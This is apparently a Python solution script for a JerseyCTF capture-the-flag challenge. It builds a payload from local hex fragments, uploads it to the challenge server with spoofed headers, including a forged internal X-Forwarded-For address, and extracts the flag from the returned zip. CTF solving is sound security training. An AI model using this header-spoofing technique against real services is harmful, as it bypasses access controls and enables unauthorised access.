#!/usr/bin/env python3
import hashlib
import io
import re
import urllib.request
import zipfile
from pathlib import Path


BASE_URL = "http://uranus-bastion.aws.jerseyctf.com:8080/upload"
EXPECTED_SHA256 = "42aa6f011ec28d2198f81407ea91217897c712ca214ef859b068b91623d31abe"


def build_payload(base_dir: Path) -> bytes:
    fragments_dir = base_dir / "payload_fragments"
    parts = []
    for path in sorted(fragments_dir.glob("phase_*.hex")):
        parts.append(path.read_text().strip())
    payload = bytes.fromhex("".join(parts))
    digest = hashlib.sha256(payload).hexdigest()
    if digest != EXPECTED_SHA256:
        raise ValueError(f"sha256 mismatch: {digest}")
    return payload


def send_payload(payload: bytes) -> bytes:
    headers = {
        "User-Agent": "UranusSync/2.3",
        "X-Forwarded-For": "10.10.42.77",
        "X-Origin-Port": "42107",
        "X-Coating-Class": "ALPHA",
        "X-Filename": "coating_layer_alpha.dat",
        "Content-Type": "text/plain",
    }
    req = urllib.request.Request(BASE_URL, data=payload, headers=headers, method="POST")
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.read()


def extract_flag(zip_bytes: bytes) -> str:
    with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
        text = zf.read("FLAG.txt").decode(errors="replace").strip()
    m = re.search(r"(jctf\{[^}]+\})", text)
    if not m:
        raise ValueError("flag not found in FLAG.txt")
    return m.group(1)


def main() -> None:
    base_dir = Path(__file__).resolve().parent
    payload = build_payload(base_dir)
    zip_bytes = send_payload(payload)
    (base_dir / "uranus_gate.zip").write_bytes(zip_bytes)
    flag = extract_flag(zip_bytes)
    print(flag)


if __name__ == "__main__":
    main()
